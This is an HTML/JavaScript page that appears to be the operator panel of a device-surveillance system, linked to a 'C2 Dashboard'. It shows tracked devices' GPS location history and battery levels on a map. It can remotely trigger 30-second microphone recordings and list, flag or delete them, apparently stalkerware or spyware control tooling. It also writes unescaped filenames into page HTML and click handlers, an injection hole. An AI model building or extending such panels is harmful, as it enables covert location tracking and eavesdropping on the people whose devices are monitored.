<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Anasio | Location History</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" crossorigin=""/>
    <style>
        #map { height: 500px; border-radius: 1rem; z-index: 10; }
        .scroller::-webkit-scrollbar { width: 6px; }
        .scroller::-webkit-scrollbar-track { background: #f1f5f9; }
        .scroller::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 4px; }
    </style>
</head>
<body class="bg-gray-100 text-gray-900 font-sans min-h-screen">
    <div class="max-w-7xl mx-auto py-8 px-4 sm:px-6">
        <nav class="mb-8 flex flex-col md:flex-row justify-between items-center bg-white p-4 rounded-2xl shadow-sm border border-gray-200">
            <div class="flex items-center gap-4">
                <div class="bg-blue-600 text-white p-2 rounded-lg">
                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"></path></svg>
                </div>
                <div><h1 class="text-xl font-bold tracking-tight text-gray-900">Historical Tracking Logs</h1></div>
            </div>
            <div class="flex items-center gap-6">
                <a href="/" class="text-xs font-bold text-gray-400 hover:text-blue-600 transition tracking-wide uppercase">C2 Dashboard</a>
                <select id="device-select" class="bg-transparent font-semibold text-gray-800 text-sm focus:outline-none cursor-pointer">
                    <option value="">Loading...</option>
                </select>
            </div>
        </nav>

        <div class="mb-6 bg-white p-4 rounded-2xl shadow-sm border border-gray-200 flex flex-wrap gap-4 items-center justify-between">
            <div class="flex items-center gap-4 flex-wrap">
                <input type="date" id="history-date" class="border border-gray-200 rounded-xl px-3 py-1.5 text-sm bg-gray-50 cursor-pointer">
                
                <div class="flex items-center gap-2 border border-gray-200 rounded-xl px-3 py-1.5 bg-gray-50">
                    <span class="text-xs font-bold text-gray-400 uppercase tracking-widest hidden sm:inline">Time:</span>
                    <input type="range" id="start-hour" min="0" max="24" value="0" class="w-16 sm:w-24 cursor-pointer accent-blue-600">
                    <span id="time-range-display" class="text-xs font-bold text-gray-700 w-24 text-center">00:00 - 24:00</span>
                    <input type="range" id="end-hour" min="0" max="24" value="24" class="w-16 sm:w-24 cursor-pointer accent-blue-600">
                </div>
            </div>
            <button type="button" onclick="resetAndFetchHistory()" class="bg-gray-900 text-white text-xs font-bold px-4 py-2.5 rounded-xl uppercase tracking-wider hover:bg-black transition">Apply Filter</button>
        </div>

        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
            <div class="flex flex-col gap-6 lg:col-span-1">
                <div class="bg-white rounded-3xl p-6 shadow-sm border border-gray-200 flex flex-col h-[500px]">
                    <div class="overflow-y-auto scroller pr-2 flex-1">
                        <table class="w-full text-left">
                            <thead><tr class="text-xs text-gray-400 border-b"><th class="pb-2">Time</th><th class="pb-2">Lat</th><th class="pb-2">Lon</th><th class="pb-2">Bat</th><th class="pb-2">Gap</th></tr></thead>
                            <tbody id="history-table" class="text-sm text-gray-600"></tbody>
                        </table>
                    </div>
                    <div id="pagination" class="flex items-center justify-between pt-3 border-t mt-2">
                        <button onclick="changePage(-1)" id="prev-btn" class="text-xs font-bold text-gray-400 hover:text-blue-600 transition disabled:opacity-30" disabled>← Prev</button>
                        <span id="page-info" class="text-[10px] font-bold text-gray-400 uppercase tracking-widest">Page 1</span>
                        <button onclick="changePage(1)" id="next-btn" class="text-xs font-bold text-gray-400 hover:text-blue-600 transition disabled:opacity-30" disabled>Next →</button>
                    </div>
                </div>
                <div class="bg-white rounded-3xl p-6 shadow-sm border border-gray-200">
                    <button onclick="requestAudio()" id="audio-btn" class="w-full bg-red-600 text-white font-bold py-3 rounded-xl hover:bg-red-500 transition shadow mb-4">Record 30s Audio</button>
                    <div id="audio-list" class="flex flex-col gap-3 max-h-48 overflow-y-auto scroller pr-2"></div>
                </div>
            </div>
            <div class="bg-white rounded-3xl p-2 shadow-sm border border-gray-200 lg:col-span-2"><div id="map"></div></div>
        </div>
    </div>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js" crossorigin=""></script>
    <script>
        const selectEl = document.getElementById('device-select');
        const tableBody = document.getElementById('history-table');
        const map = L.map('map', {zoomControl: false}).setView([0, 0], 2);
        L.control.zoom({ position: 'bottomright' }).addTo(map);
        L.tileLayer('https://{s}.basemaps.cartocdn.com/rastertiles/voyager/{z}/{x}/{y}{r}.png').addTo(map);

        let pathLine = L.polyline([], {color: '#ef4444', weight: 4}).addTo(map);
        let markersGroup = L.layerGroup().addTo(map);
        let currentDataHash = "", cachedAudioFilesStr = "", isFirstLoad = true;
        let currentPage = 1, totalPages = 1;

        async function fetchAvailableDevices() {
            try {
                const res = await fetch('/devices');
                const data = await res.json();
                if (data.devices && data.devices.length > 0) {
                    const val = selectEl.value;
                    selectEl.innerHTML = '';
                    data.devices.forEach(did => {
                        const opt = document.createElement('option');
                        opt.value = did; opt.textContent = did;
                        selectEl.appendChild(opt);
                    });
                    if (val && data.devices.includes(val)) selectEl.value = val;
                }
            } catch(err) { console.error(err); }
        }

        const dateInput = document.getElementById('history-date');
        const startHour = document.getElementById('start-hour');
        const endHour = document.getElementById('end-hour');
        const timeDisplay = document.getElementById('time-range-display');

        const today = new Date();
        dateInput.value = today.getFullYear() + '-' + String(today.getMonth() + 1).padStart(2, '0') + '-' + String(today.getDate()).padStart(2, '0');

        function updateTimeDisplay() {
            let s = parseInt(startHour.value);
            let e = parseInt(endHour.value);
            if (s > e) { let tmp = s; s = e; e = tmp; }
            timeDisplay.textContent = `${String(s).padStart(2, '0')}:00 - ${String(e).padStart(2, '0')}:00`;
        }
        startHour.addEventListener('input', updateTimeDisplay);
        endHour.addEventListener('input', updateTimeDisplay);

        function resetAndFetchHistory() { currentDataHash = ""; isFirstLoad = true; currentPage = 1; fetchHistory(); }

        function changePage(delta) {
            const newPage = currentPage + delta;
            if (newPage < 1 || newPage > totalPages) return;
            currentPage = newPage;
            currentDataHash = "";
            fetchHistory();
        }

        function updatePagination() {
            document.getElementById('page-info').textContent = `Page ${currentPage} / ${totalPages}`;
            document.getElementById('prev-btn').disabled = currentPage <= 1;
            document.getElementById('next-btn').disabled = currentPage >= totalPages;
        }

        async function fetchHistory() {
            const activeDevice = selectEl.value;
            if(!activeDevice) return;
            try {
                let qs = `?device_id=${encodeURIComponent(activeDevice)}&page=${currentPage}&per_page=500`;
                const selDateStr = dateInput.value;
                if(selDateStr) {
                    let s = parseInt(startHour.value);
                    let e = parseInt(endHour.value);
                    if (s > e) { let tmp = s; s = e; e = tmp; }
                    const [y, m, d] = selDateStr.split('-');
                    const startDate = new Date(y, m - 1, d);
                    startDate.setHours(s, 0, 0, 0);
                    const endDate = new Date(y, m - 1, d);
                    if (e === 24) { endDate.setHours(23, 59, 59, 999); } else { endDate.setHours(e, 0, 0, 0); }
                    qs += `&start_time=${startDate.getTime()/1000}&end_time=${endDate.getTime()/1000}`;
                }
                const res = await fetch(`/history_detailed${qs}`);
                const data = await res.json();
                if(!data.history) return;

                totalPages = data.total_pages || 1;
                updatePagination();

                const newHash = data.history.length > 0 ? (data.history[0].time + "_" + data.history.length + "_" + currentPage) : "empty";
                if(newHash === currentDataHash) return;
                currentDataHash = newHash;

                tableBody.innerHTML = ''; markersGroup.clearLayers();
                if(data.history.length > 0) {
                    pathLine.setLatLngs(data.history.slice().reverse().map(r => [r.lat, r.lon]));

                    // Only place markers every Nth point to prevent lag (max ~100 markers)
                    const step = Math.max(1, Math.floor(data.history.length / 100));

                    // Build table rows as a single HTML string for speed
                    let html = '';
                    data.history.forEach((row, i) => {
                        let localTimeStr = row.time;
                        if (row.unix_time) {
                            localTimeStr = new Date(row.unix_time * 1000).toLocaleString();
                        }

                        // Sparse markers — only every Nth point + first + last
                        if (i % step === 0 || i === 0 || i === data.history.length - 1) {
                            L.marker([row.lat, row.lon], {
                                icon: L.divIcon({className: 'c', html: `<div class="bg-red-500 rounded-full w-3 h-3 border border-white"></div>`, iconSize:[12,12]})
                            }).bindPopup(`Time: ${localTimeStr}<br>Bat: ${row.level}%`).addTo(markersGroup);
                        }

                        let gapStr = "-";
                        if (i < data.history.length - 1) {
                            const prevRow = data.history[i + 1];
                            const gapSecs = Math.max(0, row.unix_time - prevRow.unix_time);
                            if (gapSecs < 60) gapStr = `${Math.floor(gapSecs)}s`;
                            else if (gapSecs < 3600) gapStr = `${Math.floor(gapSecs/60)}m`;
                            else gapStr = `${Math.floor(gapSecs/3600)}h ${Math.floor((gapSecs%3600)/60)}m`;
                            if (gapSecs > 300) gapStr = `<span class="text-red-500 font-bold">${gapStr}</span>`;
                            else gapStr = `<span class="text-gray-500">${gapStr}</span>`;
                        }
                        let timeOnly = row.time.split(' ')[1] || row.time;
                        if (row.unix_time) {
                            timeOnly = new Date(row.unix_time * 1000).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', second:'2-digit'});
                        }
                        
                        html += `<tr class="border-b hover:bg-blue-50 cursor-pointer" onclick="map.setView([${row.lat},${row.lon}],17)"><td class="py-2 font-mono text-xs font-bold whitespace-nowrap">${timeOnly}</td><td class="text-xs">${row.lat.toFixed(4)}</td><td class="text-xs">${row.lon.toFixed(4)}</td><td class="text-xs font-bold ${row.level < 20 ? 'text-red-600' : 'text-green-600'}">${row.level}%</td><td class="text-xs">${gapStr}</td></tr>`;
                    });
                    tableBody.innerHTML = html;
                    if (isFirstLoad) { map.fitBounds(pathLine.getBounds(), {padding:[50,50]}); isFirstLoad = false; }
                }
            } catch(e) { console.error(e); }
        }

        async function requestAudio() {
            const activeDevice = selectEl.value;
            if(!activeDevice) return;
            const btn = document.getElementById('audio-btn');
            btn.textContent = "Waiting 30s..."; btn.disabled = true;
            const fd = new FormData();
            fd.append('device_id', activeDevice);
            fd.append('record_audio', 1);
            await fetch('/set_record_audio', { method: 'POST', body: fd});
            setTimeout(() => { btn.textContent = "Record 30s Audio"; btn.disabled = false; fetchAudioList(); }, 35000);
        }

        async function fetchAudioList() {
            const activeDevice = selectEl.value;
            if(!activeDevice) return;
            try {
                const res = await fetch(`/audio_files?device_id=${encodeURIComponent(activeDevice)}`);
                const data = await res.json();
                const str = JSON.stringify(data.files || []);
                if (str === cachedAudioFilesStr) return;
                cachedAudioFilesStr = str;
                const listEl = document.getElementById('audio-list');
                listEl.innerHTML = '';
                if(data.files && data.files.length > 0) {
                    data.files.forEach(f => {
                        const filename = f.split('/').pop();
                        if (filename.includes("BUSY")) {
                            listEl.innerHTML += `<div class="bg-red-50 border p-2 rounded text-red-600 text-xs">🚫 Mic busy!</div>`;
                        } else {
                            const isFlagged = filename.includes("_FLAG");
                            const bgClass = isFlagged ? "bg-orange-50 border-orange-300" : "bg-gray-50 border-gray-200";
                            const flagBtn = isFlagged ? `<span class="px-2 py-0.5 bg-orange-500 text-white rounded text-[10px] uppercase font-bold tracking-wider">Flagged</span>` : `<button onclick="flagAudio('${filename}')" class="px-2 py-0.5 bg-orange-100 text-orange-700 hover:bg-orange-200 rounded text-[10px] uppercase font-bold tracking-wider transition">Flag</button>`;
                            listEl.innerHTML += `
                                <div class="${bgClass} border p-2 rounded flex flex-col gap-2 transition-all">
                                    <div class="flex justify-between items-center">
                                        <span class="text-[10px] font-bold ${isFlagged ? 'text-orange-700' : 'text-gray-400'} truncate w-24" title="${filename}">${filename.substring(0, 15)}...</span>
                                        <div class="flex gap-1 items-center">
                                            ${flagBtn}
                                            <button onclick="deleteAudio('${filename}')" class="px-2 py-0.5 bg-red-100 text-red-700 hover:bg-red-200 rounded text-[10px] uppercase font-bold tracking-wider transition">Del</button>
                                        </div>
                                    </div>
                                    <audio controls class="w-full h-8" src="${f}"></audio>
                                </div>`;
                        }
                    });
                }
            } catch (e) { console.error(e); }
        }

        async function deleteAudio(filename) {
            if(!confirm("Permanently delete this recording?")) return;
            const fd = new FormData();
            fd.append('filename', filename);
            await fetch('/delete_audio', { method: 'POST', body: fd});
            cachedAudioFilesStr = "";
            fetchAudioList();
        }

        async function flagAudio(filename) {
            const fd = new FormData();
            fd.append('filename', filename);
            await fetch('/flag_audio', { method: 'POST', body: fd});
            cachedAudioFilesStr = "";
            fetchAudioList();
        }

        selectEl.addEventListener('change', () => { currentDataHash = ""; cachedAudioFilesStr = ""; isFirstLoad = true; currentPage = 1; fetchHistory(); fetchAudioList(); });
        (async () => { await fetchAvailableDevices(); fetchHistory(); fetchAudioList(); setInterval(() => { if(!document.hidden){ fetchHistory(); fetchAudioList(); } }, 5000); })();
    </script>
</body>
</html>
